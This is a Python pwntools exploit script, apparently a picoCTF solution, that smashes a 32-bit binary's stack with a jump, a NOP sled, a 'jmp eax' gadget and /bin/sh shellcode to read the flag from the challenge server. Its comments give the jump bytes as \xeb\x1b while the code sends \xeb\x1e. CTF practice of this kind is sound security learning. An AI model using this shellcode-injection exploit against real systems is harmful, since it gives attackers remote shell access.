#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 57494)

    return r


def main():
    r = conn()

    r.recvuntil(b"hopper!\n")
    #using gdb pattern we can find that the offset to overwrite eip is 28 bytes 
    #with trial and error using disasm() to find the bytes that exceute the assembly code 
    #jmp    0x20 which are b"\xeb\x1b"
    #over the address of jump eax to the shell code (\x90 is NOP bytecode) 
    payload = b"\xeb\x1e"+b"\x90"*26 
    payload+= p32(0x0805333b)  #using ropgadget command we found the jump 
                               #eax address to use it to jump back to the start of our input 
    payload+= asm(shellcraft.i386.linux.sh()) #shellcode
    print(payload)
    r.sendline(payload)
    r.sendline(b"cat flag.txt")
    print(r.recv())


if __name__ == "__main__":
    main()
